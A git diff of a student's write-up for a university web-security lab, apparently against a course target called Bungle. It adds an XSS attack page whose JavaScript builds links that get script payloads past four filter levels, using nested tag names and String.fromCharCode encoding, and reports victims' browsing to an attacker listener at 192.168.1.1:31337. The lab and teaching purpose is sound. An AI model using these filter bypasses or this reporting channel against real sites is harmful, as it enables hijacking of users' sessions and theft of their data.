@@ -597,26 +597,59 @@ I elected to export the PCAP as JSON and simply parse the captures by *key*:*val
 >>>
 >>> **\- "Report each page that is displayed (what the user thinks they are seeing) by loading the url:"**    
 >>>> \- `http://192.168.1.1:31337/stolen?event=nav&user=<username>&url=<encoded_url>`     
+> 
+> **For the sake of space, I won't break out all of the `xss_payload.html` file here**    
+> **Comments throughout source should associate the purpose of functions with the criteria listed above.**    
+> **Below is snip of the HTML `<style>` to generate a reasonably benign looking site;**    
+> **And, a snip of the functions which generate the payload as links in each of the icons in the screen shot further down.**     
 >> ```html
->> // filler
->>
+>> <meta charset="utf-8">
+>> <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+>> <style>
+>> body {background-image: url("https://i.imgur.com/GpCfuFQ.png");background-repeat: no-repeat;background-size: 25% auto;background-position: left top;display: flex;justify-content: center;align-items: center;height: 100vh;margin: 0;}
+>> .links-container {display: flex;justify-content: space-between;align-items: center;flex-wrap: wrap;padding: 20px;border: 2px solid black;width: 80%;}
+>> .flex-item {width: 100px;height: 100px;margin: 10px;border: 1px solid black;text-align: center;line-height: 100px;}
+>> h3 a {color: black;}
+>> </style>
+>> <script>
+>> function payload(attacker){
+>> //.
+>> // cut for space
+>> //.
+>> );
+>> }
+>> $("html").hide();
+>> ldP("./");
+>> }
+>> function ncdSTR(query){                                                             // FUNCTION TO ENCODE STRINGS
+>>     var myRe=/".*?"/g;var match;                                                    // MATCH ALL BETWEEN DOUBLE QUOTES
+>>     while((match=myRe.exec(query))!==null){
+>>         var ncdedSTR="";
+>>         for(var idx=1;idx<match[0].length-1;++idx){
+>>             ncdedSTR+=match[0].charCodeAt(idx)+",";}
+>>         ncdedSTR=ncdedSTR.slice(0,-1);
+>>         ncdedSTR="String.fromCharCode("+ncdedSTR+")"; 
+>>         query=query.replace(match[0],ncdedSTR);}return query;}  
+>> function mkLnk(xssdefense,target,atkr){                                              // DIVIDE OUT THE BASE URL FROM THE PAYLOAD QUERY
+>>     var bQry=target+"./search?xssdefense="+xssdefense.toString()+"&q=";
+>>     var payLd=payload.toString()+";payload(\""+atkr+"\");";
+>>     switch(xssdefense){                                                              // CASES FOR URL CONSTRUCTION BASED ON DEFENSES 0-3
+>>     case 0:return bQry+encodeURIComponent("<script"+">"+payLd+"</script"+">");
+>>     case 1:
+>>     case 2:return bQry+encodeURIComponent("<scrscriptipt>"+payLd+"</scrscriptipt"+">");
+>>     case 3:var encodedpayLd=ncdSTR("<script"+"> "+payLd+" </script"+">");return bQry+encodeURIComponent(encodedpayLd);}}
+>> const target = "http://526.edu/project2b/";
+>> const atkr =  "http://192.168.1.1:31337/";
+>> $(function(){
+>>     var container = $("<div></div>").addClass("links-container");                    // GENERATE CONTAINER LINKS FOR EACH OF THE FOUR DEFENSE LEVELS 0-3 WITH SWITCH CASE
+>>     for(var xssdefense=0;xssdefense<=3;xssdefense++){
+>>         var url=mkLnk(xssdefense,target,atkr);
+>>         container.append("<h3><a target=\"run\" href=\""+url+"\" id=\"try_link_"+xssdefense+"\">Try Bungle! "+xssdefense.toString()+"</a></h3>");}
+>>         $("body").append(container);});
+>> </script>
 >> ```
->
-> **F."**    
-> **R.**
->> ```html
->> // filler
->>        
->> ```
-> **I.**     
-> **b:**     
->
-> **I.**    
-> **T.**    
-> **T.**    
+>    
 >
 
 ### [cors_server.py](https://github.com/plmcdowe/52600/blob/ed4b61dbb8067082c3c6ec5d86f9f5ef0145be79/2b-SQL-XSS-CSRF/cors_server.py)
 ### [csrf_0.html](https://github.com/plmcdowe/52600/blob/ed4b61dbb8067082c3c6ec5d86f9f5ef0145be79/2b-SQL-XSS-CSRF/csrf_0.html)
-
-
